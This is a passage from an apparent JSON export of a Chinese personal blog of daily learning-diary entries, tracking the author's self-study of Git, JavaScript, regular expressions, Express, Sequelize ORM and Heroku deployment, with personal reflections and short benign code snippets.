指令其實之前都有學過，所以這邊就不特別列出來了，等要做筆記的時候會在寫清楚一點。 一些感想其實我有點好奇為什麼有些人能夠用很簡單的想法去解釋一件知識（例如說資料夾模擬法），我試著問過自己身邊的人這個問題。我得到的回答很簡單：多數人其實也只能是從別人的身上去領悟某些事，又或者是剛好發生了什麼所以才讓他理解了某件事。但我還是想不通為什麼會有這種差異，因為我總是沒什麼自己的想法的感覺。 就好比以前的我學 Git 時看書學了好幾天，卻只學到冰冷冷的指令。我沒有對 Git 產生什麼特殊的感情，只知道他是一個身為軟體工程師都應該要學會的東西，所以我必須把它學會。 要我用自己的方式來教人 Git 的話，我大概也會像我看的書一樣，冰冷冷的告訴你可以怎麼用 Git 的指令，然後把 Git 講的像是很厲害的東西，但你可能感覺不出來他哪裡厲害。 還是講些其他的吧，其實我挺開心自己訂閱了 Lidemy 的課程。雖然才剛開始，學的都只是些很基礎的東西，但我還是學到了不少東西。 熱情是很重要的一件事，在上這門課的時候，我從 Huli 的身上看到了一股喜歡程式的熱情。有時候我會覺得時間過得好慢，好慢。但是今天不一樣，時間彷彿一下就流逝了。我其實也還想再繼續上課，但時間還是要控制妥當才行。 期許我覺得今天是很開心的一天，也很想趕快讓自己學習越來越多事情，希望能夠離自己的目標越來越接近。 希望明天我能夠把 Git 的課程都看完。目前的想法是每天都要打心得，還有把學習到的東西都做成一個文章筆記，這樣子當我需要的時候就可以來部落格翻來看。","link":"/2021/12/11/mentor-program-day01/"},{"title":"mentor-program-day02","text":"今天是學習計畫的第二天，一樣來記錄一下自己在今天做了什麼。 進度今天的進度不多，只把 Git 的部分看到了 49%。 其實本來預期要把 Git 的課程給全部看完，不過下午的時候就跟女朋友出門去散散心，所以就只看了一些而已。 因為希望自己還是能有一點進度，所以晚上利用了一點時間把昨天學到的 Git 知識整理成三篇筆記。 從自己做版控來學 Git 從資料夾來理解分支的概念 解決 Git 中的衝突（Conflict） 學到的事情今天讓我最印象深刻的部分是「Conflict」的部分吧。以前在看書學 Git 的時候，Coflict 一直是我沒弄懂的部分（也可能是那本書寫的太糟吧）。 以前其實也沒有很懂 Git 實際上好用的地方，所以別說要建立分支，連要用到 Git 的機會都蠻少的，所以就一直把 Conflict 這個部分給丟在一旁了。 在今天重新複習分支與衝突的觀念後，我想接下來的日子我會開始養成用 Git 的習慣吧。還是那句老話，工具是用來把一些事情給弄得更輕鬆，而不是用來拖人後腿的。 題外話今天跟女朋友出去散步時聊了很多，其中有一件事情還蠻有趣的，所以我想記錄下來。 有一段談話是在討論我 學習計畫 中的內容： 首先，這份學習計畫主要是參考 程式導師實驗計畫第五期 提供的課綱，以及 Lidemy 鋰學院 上所提供的課程作為學習教材。我並不是該計畫中的學生，只是在近日體會到自己在前端這個領域還有很多東西沒有摸透，所以決定為自己做一份新的學習計畫，重新好好學習。希望在完成這份計畫後，自己能夠把身為一個前端該知道的所有知識都給理解透徹。我學習前端其實已經有一段時間了，所以這個計畫會依自己的需求來做調整，把一些我已經了解的部分給省略掉，或者是快速複習帶過，並不會完全從零開始學習。（雖然我寫完後才發現其實沒差多少）另外也很謝謝程式導師計畫的作者 Huli，提供了非常詳細的課綱。我是個很不會安排跟規劃的人，所以能有這樣完整的參考方向，真的幫助了我許多，十分感謝。那麼，讓我們一起期待這份學習計畫能夠順利完成吧！ 我女朋友一開始跟我說「你在內容說『我是個很不會安排跟規劃的人，所以能有這樣完整的參考方向，真的幫助了我許多，十分感謝』，這樣會讓人感覺你是不是很不會安排或規劃阿？」 我也提出了自己的看法：「可是，我的話會覺得這個人至少知道自己的問題，然後他也試著想要做點改善，你不會嗎？」 其實每個人的看待一件事情的想法本來就會不一樣，有些人可能會跟我女朋友的看法一樣，也有些人可能會跟我的看法一樣，其實兩種都沒有對或錯，只是就每個人有自己的想法吧。 但比較有趣的其實是另外一件事。 我在回答完我女朋友後，我思考了一件事：為什麼我當初會寫自己很不會安排的這件事情？ 這時候一句話突然從我嘴裡脫口而出：「其實我只是因為想謝謝 Huli，所以才這樣寫。」 頓時，我們兩個好像都領悟了一件事：原來是我們想傳達的對象不同 沒錯，我女朋友想傳達的對象是公司的人資，因為我最近正在找工作，所以她擔心人資如果看到我寫了這樣的東西會有什麼樣的想法？ 但我並沒有考慮這個問題，因為我想傳達的對象是 Hui，我想傳達的是我很感謝他提供這份課綱的訊息。 所以今天不只學到了關於 Git 的一些知識，我也學到了另一件事：一段訊息會因為你想傳達的對象不同，而有不同的解讀方式。 期許明天就是學習計畫正式執行的時間了（這兩天只是我偷跑，因為我怕我進度跟不上），希望在接下來的日子中可以一切順利。 明天的計畫是把 Git 的部分看完，然後可以的話開始把作業完成一些，大概就是這樣吧。","link":"/2021/12/12/mentor-program-day02/"},{"title":"mentor-program-day03","text":"yo ～到了第三天，雖然有點懶，但還是來乖乖做個紀錄。 進度今天把 Git 的部分給看完了，也做了筆記： Git hook Git 指令 使用 Git 遠端功能時可能會碰到的問題 Git bash 上的快捷鍵 clone 跟 fork 的差異 GitHub 的一些基本功能 Git 中的狀況劇 GitHub 的一些小知識 我想要發 pull request 到別人的專案要怎麼做？ 其實以前就想像這樣做一大堆的筆記了，只是以前寫文章會太糾結很多事情，導致寫一篇文章都要花一大堆時間想這個想那個的。現在回想起來還真是蠻不值得的。 雖然沒有達到預期的目標（看完影片 + 做作業），但感覺有慢慢進入步調了，應該能越來越順利走下去。 學到的事情如果我沒記錯的話，昨天主要是在學「分支」的東西吧，所以今天大部分在學「遠端」的事情。 今天依然是收穫滿滿，很多以前似懂非懂的東西都搞清楚了，像是「pull 跟 push」、「怎麼發 pull request」、「clone 跟 fork 的差別」等等。 在理解這些東西的用途後，其實也不會再像以前一樣覺得怎麼那麼複雜，怎麼那麼多東西要記的感覺。 除了 Git 的內容之外，我也學到其實要把學習時可以試著把焦點放在「比較重要」的那些部分。以 Git 來舉例的話，就像 Git 指令 中的提到的指令其實就足以應付大部分的情境。可是如果你想要完全把 Git 給弄的一清二楚，那你可能就要多學很多指令，像是 git cherry-pick、git rebase 等等之類的。 題外話昨天看了鬼滅之刃油鍋篇的第二集，覺得動畫公司真的很會吊人胃口，怎麼都剛好挑那麼精彩的部分結束。害我每個禮拜看的時候都搞得緊張兮兮的，不知道什麼時候突然就會被切 ED 一樣。 雖然說這個計畫要預計要跑六個月才會跑完，但還是希望能趕快跑完呀，不想每次面試都被洗臉，每次都要幫自己 QQ。 既然有提到鬼滅，那就順便分享一下 Aimer 唱的主題曲吧：残響散歌 期許希望明天可以把 HW1 的作業給做完，然後快速進到下個的階段的計畫。","link":"/2021/12/14/mentor-program-day03/"},{"title":"mentor-program-day05","text":"覺得明天得好好趕進度的第五天 進度今天花了大概兩個小時的時間做了一間公司的線上測試題目，先放張圖幫自己 QQ： （希望十年後的我會懷念弱弱的自己） 其實光第二題就卡了我大概一小時的時間。這題主要是要考用 JS 來爬 DOM 節點的能力，不過我太久沒碰所以花了很多時間，結果還是沒研究出來。 在做完測驗後，我上網做了一些研究，發現有人的做法是寫一個函式來把 DOM 節點的空白字元（文字節點）給過濾掉的方式： 12345678910function cleanWhitespace(oEelement) { for (var i = 0; i &lt; oEelement.childNodes.length; i++) { var node = oEelement.childNodes[i] // noeeType3 = 文字節點 and 空白字元 if (node.nodeType == 3 &amp;&amp; !/\\S/.test(node.nodeValue)) { // 砍掉子節點 node.parentNode.removeChild(node) } }} 其實就是剛好看到裡面的 /\\s/，再加上前幾間面試的公司剛好又考到正則表達式，就有股想要跟它做個了結的衝動，於是就又花了一個下午的時間來研究，也寫了一點筆記： 正則表達式 正則表達式的實戰演練 不過該做的還是要做，今天雖然進度少，但也是把 hw5 給做完了。 看過去的同學的作業學到了蠻多事情，也發現有些人的學習背景很有趣。記得有一位說他學了某個 CLI 的指令是為了偷玩電腦 XD，看來大家從小就有當駭客的潛力啊。 學到的事情今天學到最多的就是正則表達式吧，以前都覺得那是寫給妖魔鬼怪看的東西（因為他長得很可怕）。就算知道那是一個可以幫助解題的工具，但沒有實際自己去撞過牆，就不知道為什麼要學那些新東西。像是在 正則表達式的實戰演練 中的題目，如果不用正則表達式來解題的話，也許得用很繁雜的步驟才有辦法達成。 學完後還蠻開心的，未來如果碰到類似的文字難題，我想我應該能夠好好利用這個工具，不用再像原本那樣用內建方法來處理資料。也慶幸自己有做這些筆記，就算真的忘記了也都能隨時來回溫。 現在雖然才過五天，但在這五天我寫了好多東西，也從寫東西這件事得到了一點感想。雖然不知道這跟寫東西有沒有關係，但是現在會為了想把筆記做的完整，所以在學習的時候變得很常去做範例，覺得做範例可以更加的理解一個概念。 總之，不管在學什麼新東西，直接做題目的學習效果我覺得是很有幫助的。 題外話最近在看的書是「The power of habit」，有件事情我覺得非常的有意思。 書中提到人們會排斥自己不熟悉（不習慣）的東西，像是如果突然要你吃一個你很陌生的食物，你多半會很排斥。但是如果用你熟悉的方式來烹調這個食物，你可能就會有蠻大的機率吃下它。 有一個很經典的話是： 用舊習慣包裝新東西，大家就會比較容易接受。 有一個很特別的例子是 Outkast - Hey Ya! 這首歌。 這首歌在一開始大家都覺得很難聽（僅管某個程式的計算結果告訴電台這首歌將會爆紅），但是當電台把這首歌夾在類似的夯歌之間播放後，大家逐漸愛上了這首歌，最後還得了葛萊美獎，真的是太瞎了！ 這又讓我想起，女朋友常跟我說人是個很簡單的生物這回事(っ ●ω●)っ 期許明天想開始學下周的進度，然後邊利用時間來研究 week1 的挑戰題，希望兩件事情都可以做好 QQ。","link":"/2021/12/16/mentor-program-day05/"},{"title":"mentor-program-day04","text":"風平浪靜的第四天。 進度今天做了 week1 的作業。本來以為能很順利完成，但結果只完成了三個： hw1 hw3 hw4 另外也做了幾個新的筆記跟更新： Commandline 的指令VS-Code 一些實用的快捷鍵我想要發 pull request 到別人的專案要怎麼做？ 主要是花了比較多時間研究交作業的流程，還有寫教學文花了比較多時間。 學到的事情有好一陣子沒有像這樣子寫教學文了，自從我開始寫筆記而不是文章後才體會到，寫教學文跟做筆記其實是兩件不同的事。 寫給自己看的筆記可以很清楚該寫什麼，只要把自己不清楚的部分寫下來就可以了。但教學文並不是這樣，你得考慮對方能不能理解？對方的程度是怎麼樣？怎麼樣才能讓對方比較清楚？ 你得先站在對方的角度來思考每一件事，才知道大概怎麼去下筆，而不是完全以你自己的想法下去描繪。 其實我早期的文章就是以教學文的方式來撰寫，像是 一步一步認識 Grid、在學響應式設計前，你應該先知道這些。、數字系統並沒有你想的那麼複雜 都是這樣的風格。 總之，我覺得當老師真的是件不容易的事情。 還有另外一件事情也讓人感觸蠻深的，就是「把你所學的知識給實際應用」這件事。 我本來以為看完影片學完 Git 的我應該在操作 Git 應該不會有什麼問題，但是直到寫 hw1 的時候我就發現我錯了。我確實在課程中學到 Git 遠端操作的一些知識，還有 pull request 的流程，但是我沒有實作過。到了這個時候我才意識到「只是理解還不夠」這件事。 為了讓自己弄清楚 pull request 的流程，我看了過去的學生與助教的互動過程，接著又一步一步自己按照上課提到的流程實際自己走過一遍，最後才真的弄清楚整個來龍去脈。 不管你在學什麼，隨時都要檢視自己的問題，找出自已的問題在哪裡，試著把這些問題給改善。是我女朋友常常會告訴我的一些話，也是我覺得最難做到的事情。 現在的我也許還是很不夠清楚自己的問題，但我會試著這些事情都紀錄下來，時時刻刻提醒自己不要忘了過去的自己曾經犯下了哪些錯誤。 題外話今天跟女朋友一起煮了晚餐，晚餐煮了蔬菜味噌湯蔬菜麵（滿滿的蔬菜）。總覺得這是一天繁忙之中的短暫幸福時光，雖然希望自己能變得越來越強，但在花時間努力學習的過程也少了很多可以陪伴女朋友的時間，有一點傷心。 希望未來自己真的變強之後，可以有更多的時間陪伴女朋友，兩個人開開心心的過日子。 期許希望明天可以把 week1 的作業完成，挑戰題的部分希望也可以試著去嘗試看能不能做出來。當我越來越進入狀況後，希望我的速度也能慢慢跟著加速。","link":"/2021/12/15/mentor-program-day04/"},{"title":"mentor-program-day06","text":"進入到新進度的一天 進度今天把 week1 的挑戰題給做完了：num.sh，也學到了一點基礎的 shell script 語法，跟做了簡單的筆記：我的第一個 Shell Script。 本來想把超級挑戰題也給做完，但是怕自己花太多時間而延後了進度，所以目前只研究了一半。希望之後有時間再慢慢把它給完成。 今天終於進入到 week2 的進度了，目前把「[JS101]用 JavaScript 一步步打造程式基礎」看到 21% ，也依照慣例做了筆記： 很有趣的位移運算子與位元運算 從 Object 的等號來真正理解變數 雖然做筆記會比較花時間，但我自己覺得這對學習蠻有幫助的，所以還是會把覺得不錯的東西給筆記下來。 學到的事情其實今天學到的東西都很精彩，特別是「位移運算」跟「位元運算」這兩個東西。還記得以前在做 LidemyOJ 的時候有提到這個東西，但當時在檢討完後就沒有繼續研究下去，所以沒把這個很潮的技巧學起來，現在想想其實還蠻可惜的。 另外一個東西是「變數真正的概念」，這個東西以前也搞得我蠻豆頁痛的。以前在看書學的時候雖然很認真讀，不過也不知道為什麼，當時的我就是想不通，分不清楚參考值跟真的值的差別。不過好在今天看完課程後有弄清楚了。希望接下來的日子裡可以一步一步跟 JavaScript 打好關係，雖然以前我們很陌生，但相信最後能成為好朋友的吧 (つд⊂)？ 題外話覺得有句話很有道理： 很多時候，你可能都不知道你學的這些東西在哪一天能用到，但總有一天突然就會派上用場。 像是今天能把「位元運算」跟「位移運算」給學的很完整，有一部份要感謝我前陣子看了 Crash Course Computer Science 的課程。其實我沒有全部看完，大概只看到第十集而已，但很巧的是正好裡面有提到關於位元運算的概念。 原本在看的時候也會想說，雖然這些東西確實跟電腦還挺相關的，不過有些時候還真的不知道這些東西在學習程式上能帶來什麼幫助，結果今天很巧的用到了這些相關的知識，覺得很神奇。 還有另外一個就是變數儲存記憶體位址的概念吧，記得第一次看到這個概念是從 C 語言的教學書上看到的（儘管我根本沒把指標那個章節給看完）。 這些曾經做過的小事情，其實都會無形的在學習上帶來幫助，我覺得很有趣。在體會到這些後，自己也更願意去學習各種新東西，就算我當下可能不知道那能為我帶來什麼幫助。 阿對了，聽說最近快冬至了，所以來分享一下好吃的湯圓：小丸子包餡小湯圓麻吉組 期許希望明天能把 [JS101] 看到 week2 的進度，還有 [ALG101] 跟 [CS101] 也能順便的話是最好囉 (๑•́ ₃ •̀๑) 也希望有機會能把 week1 的超級挑戰題給研究出來，加油！","link":"/2021/12/17/mentor-program-day06/"},{"title":"mentor-program-day07","text":"第一個禮拜過去了～好快！ 進度今天把 week1 的 超級挑戰題 給完成了，雖然有參考 Huli 跟一位同學的解答，不過也是有把每個指令的意思給弄懂才自己一行一行敲出來。希望學到更多的時候可以把它改善的更穩定吧，不然目前的解法不夠聰明。 [JS101] 目前看到了 29%，跟整理了一些筆記： ++ 跟 – 放前面後面的差別 邏輯運算中的短路 JavaScritp 中的資料型別 變數運算時該注意的幾件事 if 跟 if else 可能會犯的錯誤 if 的演化史 switch case 三元運算子 本來以為這些基礎的東西應該不會花我太多時間，但事實發現自己的基礎真的沒有打好呀。 希望之後的進度也能繼續順利執行，要加油～ 學到的事情今天學到的東西主要是基本概念為主，好玩的地方是學到了一些小技巧，像是 ++/-- 的應用、邏輯短路、mapping 等等。也發現有些語法背後的來源出自於人性的感覺 XD，很有意思，像在看歷史一樣。 除了筆記做的內容之外，今天也重新複習了迴圈這個東西。 迴圈的說難不難，但要複雜也可以很複雜。前陣子參加競賽時，在處裡 API 資料的時候，那個迴圈實在是搞得自己頭暈目眩 ヽ(☉д⊙) 迴圈的底子真的要打好才行，因為它是個很重要也幾乎到哪會用到的東西。希望這一次能夠再把這部分的基礎打得更鞏固一些。 走到現在已經第七天了，覺得以前的我可能太糾結一些事情了，總會把簡單的事情想得太複雜，但其實沒有這個必要。適度的簡化一些東西，讓自己能夠理解某個概念比較重要，複雜的部份可以等要精深的時候再慢慢鑽研就好了，我想是這樣子吧。 題外話其實今天是個狀況還蠻糟的一天，跟女朋友吵架了 ｡ﾟ(ﾟ´ω`ﾟ)ﾟ｡ 所以有點算是硬著頭皮在逼自己學習，專心的程度也多少受了一點影響，唉～要把每一件事情都做好真的不是件容易的事。 心情不好的時候聽聽歌，我覺得會讓心情稍微放鬆一些，所以順手分享一下好歌囉：ヨルシカ - 春泥棒 另外希望有天能把這個綠綠的東西給填滿： （感覺很有成就感～～～） 期許偷看了一下進度條，感覺明天沒辦法把 [JS101] 看完阿…，但還是盡力吧！","link":"/2021/12/18/mentor-program-day07/"},{"title":"mentor-program-day08","text":"有點燒腦袋的一天(´･ω･`) 進度今天把 [JS101] 看到了 36%，本來以為能順利看完，但 function 的內容比我預期中來得複雜一些 QQ。 還是依照慣例做了筆記： 重新認識迴圈 理解 function 傳遞參數的機制 把 function 當作參數 函式的宣告方式 函式填空法 函式中的 arguments 物件與 Array-like Object 這次筆記花了比較多時間來寫，也在過程中瞭解到自己跟 function 可能真的蠻陌生的，希望之後要好好把這部分給加強才行。 學到的事情在學迴圈的時候，體會到一件事：試著去領悟每個語法背後的內涵，能夠加深記憶。 記得第一次學迴圈的時候，只知道迴圈就是一直重複做某件事情的語法，跟每一種語法有各自不同的用途：while 適合用在用在不確定要跑幾圈的情況；do while 適合用在至少執行一圈的情況；for 適合用在已經確定會跑幾圈的情況。 其實這樣的學習方式也沒有什麼不對，只是我覺得領悟比較沒有那麼深而已。 今天在學到 goto 與 label 的概念之後，其實也體會到迴圈背後的演化過程。不論是哪種迴圈，背後的結構都是類似的，主要的差別只在於一些執行順序的問題吧。 在理解這些後我就能說自己非常懂嗎？其實也不是，只是會覺得自己有了更深的理解，但我相信這樣的理解對未來總會在某天帶給我無形的幫助吧。 除了迴圈之外，今天也學習了關於 function 的知識。我覺得 function 要簡單可以想得很簡單，但要複雜也可以複雜到你頭暈目眩，換句話說就是易學難精吧。 就好像我可能以為我懂什麼是 callback function，但如果換一種寫法我可能就會腦袋卡住，就跟今天一樣，我體會到了自己其實沒有完全弄懂的這件事。 總而言之，重要的還是多練習吧，一個 function 可以寫出的解法永遠都不會只有一種，我也不可能一夕之間就把每種解法都刻在腦海裡。我唯一能做的事情就是慢慢累積經驗，不要局限在一種做法，盡量去探索各種可能。 題外話不知道有沒有人也喜歡吃豆花，我覺得自由市場裡的有一間叫做冷凍豆花的豆花很好吃，但好像找不到地標所以沒辦法貼店家資訊。 明天又到了一個禮拜的結尾，有新的鬼滅可以看，開心 (●__●) 期許明天真的該把 [JS101] 給看完，然後好好練習題目，也做一點 week2 的作業，順利的話就把 [ALG101] 跟 [CS101] 給複習一下，大概是這樣。","link":"/2021/12/18/mentor-program-day08/"},{"title":"mentor-program-day09","text":"邊愛睏邊紀錄。 進度今天晚上跟女朋友出去約會了，所以進度不多。 [JS101] 看到了 45%。其實也能算是看完了，剩下的部分看起來主要是練習跟實作為主。 筆記的部分因為還沒有時間整理，所以今天沒有，只有寫了一個我早上無聊拿 C 語言起來讀時學到的遞迴函式： 實作遞迴函式 學到的事情先談談遞迴函式。遞迴函式其實背後的概念跟迴圈有異曲同工之妙。相同的地方在於兩者都需要有「終止條件」來從無線的循環中跳出；只是遞迴給人的感覺又更抽象了一些。 今天複習了很多 JavaScript 中的內建函式，也有自己實作了其中幾個，以及很重要的 Immutable（不可變） 概念。 題外話昨天睡前把 C 語言又拿起來看了一點關於「指標」的東西，覺得指標是個神奇的東西。 可惜目前比較沒有多餘的時間來實作，希望等之後有時間的時候可以來複習一下好久沒碰的 CCCCC。 期許明天的目標是把 [JS101] 練習題的部份給做完，還有把今天學到的東西該做的筆記給完成。 太愛睏了，先來睡了，晚安。","link":"/2021/12/20/mentor-program-day09/"},{"title":"mentor-program-day10","text":"又來到新的一週。 進度今天努力填坑，把昨天該做的筆記都給做完了： function 的回傳值 跟數字有關的內建函式 把數字轉字串的兩種方法 跟字串有關的內建函式 字元是可以比大小的 陣列的內建函式 實作陣列內建函式 實作字串內建函式 Immutable 的觀念 善用 console.log 來除錯 Chorme-devtool 的冷知識 另外也順利把 [JS101] 看到 week2 的進度（55%），還有 week2 的作業也做了一些： HW1 HW2 HW3 HW4 HW5 學到的事情在做筆記的時候特別有感觸的是 Immutable 的概念跟 console.log 的方便之處。 有時候在用內建函式的時候真的會不小心寫出像是 a.toString() 就以為東西改好了的這種糗事 XD，不過幸好有即時複習，也因為犯錯而讓記憶更加深刻些。希望之後能更熟能生巧。 另外自己在做一些練習的時候正好就碰到了 Bug， 於是就用了 console.log 大法。不得不說這真的是一個蠻有效的方式，當我把相關的資訊都給 log 出來後，馬上就可以找出問題在哪裡，突然為以前不懂得怎麼下 console.log 的我感到哀傷 (●__●) 題外話今天的晚餐吃了一顆核桃葡萄饅頭 15 元。本來想說有核桃很划算耶，但原來核桃只有一顆，幫自己 QQ，但還是蠻好吃的啦。 希望我以後也能在自己家裡買一顆可愛的聖誕樹來裝飾，女朋友應該會很開心。 期許希望明天可以把 week2 的進度都給完成！快速進到下一週進度～","link":"/2021/12/21/mentor-program-day10/"},{"title":"mentor-program-day100","text":"得繼續加緊腳步。 進度今天繼續看 [BE201] 探索 Express，目前進度大概 50% 左右，雖然 Express + MVC 整體上比 PHP 簡潔很多，但還是需要一點時間來熟悉與練習。總之再多加油吧。 學到的事情今天主要就是練習 Express 的實作和各種 Middleware。邊做邊作筆記，但筆記會等完整一點後才會上傳上來。 另外在使用 connect-flash 這個 Middleware 時踩了一個很慘的雷，就是使用順序： 先使用 session 再使用 connect-flash 12345678910const flash = require('connect-flash');const session = require('express-session');// session 先app.use(session({ secret: 'keyboard cat', resave: false, saveUninitialized: true,}))// 接著才可以用 flashapp.use(flash()); 為什麼說這個雷很慘？ 慘在明明功能運作不正常，卻完全不會有錯誤訊息。 這種 bug 才是最可怕的，因為你根本不知道問題出在哪裡。所以我前後大概花了大概一小時才把這個 bug 除掉，這樣你還不覺得可怕嗎？ 題外話不知道自己的時間夠不夠，得盡快才行。 期許明天繼續趕進度，希望能把 [BE201] 看完。","link":"/2022/03/24/mentor-program-day100/"},{"title":"mentor-program-day101","text":"各種擔心。 進度今天繼續看 [BE201] 學習 ORM 的部分。 這幾天發生了不少事，思緒還蠻凌亂的，所以進度有點慘，不過還是會盡力加油的。 學到的事情ORM 是個很不錯的 library，當初在寫 PHP 的時候就有想過是不是能把 SQL 的部分抽出來寫成 function，像這樣： 12const result = sql('INSERT', ['username', 'password']);console.log(result) // 0 or 1 這就跟 ORM 的本質有點像吧，只是寫成物件導向的型式會更好一點。 題外話最近有一些新的打算，希望可以一帆風順。 期許明天繼續看 [BE201]，如果可以看完就好了。","link":"/2022/03/25/mentor-program-day101/"},{"title":"mentor-program-day102","text":"繼續衝衝衝。 進度今天總算是把 ORM 的部分看完了，也把整理好的筆記放上來了： Express 和 Apache 的差別 MVC 架構與基本範例 認識 Express 中的 Middleware 使用 Express 時的注意事項，還有一些地雷 使用 ORM 的事前準備 ORM 的 CRUD ORM 建立關聯 Sequelize-CLI 基本使用 接下來剩下部署的部分而已，一樣希望一切順利。 學到的事情在重看很多次影片、筆記和實作以後，感覺對 ORM 有比較熟悉一點了，接下來也是一樣做更多練習來讓自己更熟悉吧！ 一開始在學 Sequelize CLI 的時候，對 Migration 的概念還蠻模糊的。不過多試幾次以後有比較清楚一些，雖然途中少不了各種地雷…但這就是學習的過程吧。 題外話要相信自己能做到，加油。 期許希望明天可以把 [BE201] 結束！","link":"/2022/03/26/mentor-program-day102/"},{"title":"mentor-program-day103","text":"走得慢也要繼續走。 進度今天基本上沒做什麼，只有簡單看了一下佈署的部分。後來也因為一些事情所以沒精神做事情，跑去隨便寫一些 React 基礎當作打發時間。 學到的事情這幾天應該進度都不會太好，但還是會盡力走下去的。 題外話希望每個人都可以幸福。 期許希望明天可以把東西佈署上去吧，大概就這樣。","link":"/2022/03/27/mentor-program-day103/"},{"title":"mentor-program-day104","text":"該繼續往前了。 進度今天什麼都沒做，只有看了一點點影片 + 隨手寫 React。 明天要好好打起精神繼續努力了。 學到的事情硬要說的話，只有對 useState 和 Component 有稍微認識了一些吧。 題外話 工程師的日常就是除了一個錯之後看到的不是正常，而是看到下一個錯誤訊息。要有耐心。 偶然看到這句話覺得還蠻貼切的，所以就貼上來吧。 期許今天沒做到該做的事，所以明天要好好做完。","link":"/2022/03/28/mentor-program-day104/"},{"title":"mentor-program-day105","text":"好好珍惜我們所擁有的。 進度今天努力的跑進度，成功把網站丟到 Heroku 上部署了，也做了一點筆記： 什麼是正向代理與反向代理 Heroku 的部署流程 Heroko 設定資料庫 cleardb 總算是告一段落了，接下來就是做作業了。 學到的事情感覺對部署有越來越熟悉了，其實做來做去主要都這幾個動作： 把檔案放到某個地方（虛擬主機 / 虛擬平台 / 實體主機） 建置環境（資料庫 or 伺服器） 細部微調 雖然第一次做的時候會覺得很矇，不太清楚自己在幹嘛，但很慶幸經過練習後逐漸掌握了。 資料庫的本質蠻簡單的，不過設定起來還真的有點麻煩，希望之後能越做越順。 最後是重構（refactoring）這件事。要怎麼快速的重構還真是門學問，總之多練習吧。 題外話還是希望每個人都能幸福就好。 期許希望明天可以順利把 blog 重構完成。","link":"/2022/03/29/mentor-program-day105/"},{"title":"mentor-program-day106","text":"繼續與雜亂的 code 相處。 進度今天開始重構之前用 PHP 寫的部落格，目前大概完成了 80% 吧： 先不說重構有多麻煩，不得不說 JS + ORM + MVC 來寫後端真的爽快很多。 一來是我本來就跟 JS 比較熟，再加上用了 ORM 就不用再寫 SQL Query，還有 MVC 這乾淨的架構，怪不得現在很少人再用純 PHP 來寫網站了，這點我頗有感觸～ 不過剛剛也透漏了，其實重構還是很麻煩的，畢竟這跟原本寫 PHP 的寫法差蠻多的（尤其是沒有 MVC 架構），所以幾乎所有地方都得重新改才行。這也是為什麼我花了一天還沒辦法全部重構完畢 QQ 順道一提，我現在體會到 Restful 這東西講成白話就是「URL 潔癖」吧，哈哈哈。雖然我也想說這次重構來試看看 Restful 的 pattern 好了，不過後來發現這需要依賴前端用 AJAX 才行。所以目前只好作罷，等以後有機會再試試看吧。 學到的事情今天寫了一整天的 code，主要是練習 Express 和 ORM 的部分吧，有些地方我還卡蠻久跟不夠熟悉，希望能在這週做完作業後變得熟能生巧。 題外話繼續加油吧！ 期許希望明天能順利重構完畢，跟能順便做下個作業的話就更好了。","link":"/2022/03/30/mentor-program-day106/"},{"title":"mentor-program-day107","text":"持續往前走吧。 進度雖然今天不小心睡了太長的午覺，但還是把部落格給重構完畢 + 部署到 Heroku 和 GitHub 上： Heroku：https://github.com/jubeatt/Express-blog GitHub：https://peanu-blog.herokuapp.com/ 明天要來好好努力把剩下的作業做完！ 學到的事情今天也是複習 Express + ORM 的用法，感覺有在更熟悉一些。 題外話還在考慮接下來的進度該不該跳過，得再多想想看。 期許希望明天做作業順利。","link":"/2022/03/31/mentor-program-day107/"},{"title":"mentor-program-day108","text":"趕工趕工。 進度今天重新把 Sequelize 的我沒搞懂的地方再複習一遍，總算是理解 Migration 是幹嘛用的了，以及它跟 Model 的差別在哪裡。附上一下做的筆記： 重新理解 Sequelize 中的 Migration 和 Model Sequelize 透過 Migration 來修改 Table 資訊 接下來就去做第二個作業了，目前只把以前做的東西整合起來，再添加一些功能上需要的 UI 介面，還有一些基本的後端功能： 沒意外的話會順便把下一週的功能順便做一做，這樣就是一個比較完整的專案了。（不過似乎有蠻多 UI 得刻… 先幫自己 QQ 學到的事情今天總算弄懂 Migration 的用途，不然以前在新增欄位或修改欄位時真的蠻？？？想說總不能永遠都用 db:migrate:undo:all 把資料全部砍掉重練吧，這樣太詭異了。好在今天有把它弄懂，現在對於 ORM 可以說是越來越熟悉了，很好！ 開始做第二份作業後，又回到好久不見的刻畫面流程。不得不說有時腦袋沒畫面還要腦補挺麻煩的，這也是設計師的存在意義吧，有設計稿真的能節省一些時間（當然，也會有花更多時間的情況就是了）。 題外話框架為你帶來了什麼好處？當你寫越久的 code 就越能理解這件事。 期許還是一樣，希望明天做作業順利！","link":"/2022/04/01/mentor-program-day108/"},{"title":"mentor-program-day109","text":"遲來的一天。 進度本來是第 110 天的，不過家裡的寶貝在今天離開了。心情實在太複雜，也很難受，所以就少了一天的進度，但那也不重要了。現在唯一的希望是他能夠到另一個幸福的世界生活，還有和他的夥伴們在一起，這樣就好了。 既然今天沒有進度，那就報告前一天的吧。 前天我把作業給完成了： 寫一個抽獎的 API，在串到前端去 寫一個管理抽獎的後台 設計後台的 RWD 版面跟切版 大概主要是這樣子吧，比較棘手的地方是後台介面要切成 RWD 還蠻難發揮的，畢竟後台講求功能性，要設計的讓手機上也能好操作還真不是件容易的事情。 學到的事情主要就是繼續練習 Express 和 ORM 的操作，做到這裡也對這些更加熟悉了。 後來也花了一點時間去研究和環境變數有關的東西，應該之後就會改成這樣的形式來寫設定檔吧。不過這裡還是想吐槽一下 Sequelize 的設定檔，不知道是不是有 bug？明明寫了 Sequelizerc，卻完全沒辦法套用，上網找也找不到解法。 總之最後的解法是直接去改 entry 的內容才出現效果，雖然不知道這樣的做法正不正確，但我看其他同學也是這樣做的，所以應該也不失為一種作法吧（或是如果有人知道的話，歡迎告訴我一聲）。 題外話依然不捨，不論是哪一個孩子。 期許原本的計畫是把餐廳網站給做完整，但也許我沒有那麼多時間，可能真的得先往 React 走吧，加油。","link":"/2022/04/03/mentor-program-day109/"},{"title":"mentor-program-day11","text":"聽說今天是冬至。 進度開始進入到 [ALG101] 的課程，目前的進度 22 %。 花了比較多的時間在練習與實作，筆記相對做的不多： 變數的命名哲學 找出次大值 上一次修 [ALG101] 時沒有把自己比較不熟的題目給多練習與筆記，這一次想把我覺得不錯或是值得練習的題目給紀錄到部落格裡，這樣就能經常回來練習或參考了。 另外這次也特地開了一個 repo。以前就想做類似這樣的事了，但因為當時 Git 用的不熟，所以都沒這樣子做，這次有這樣的機會還蠻開心的！ 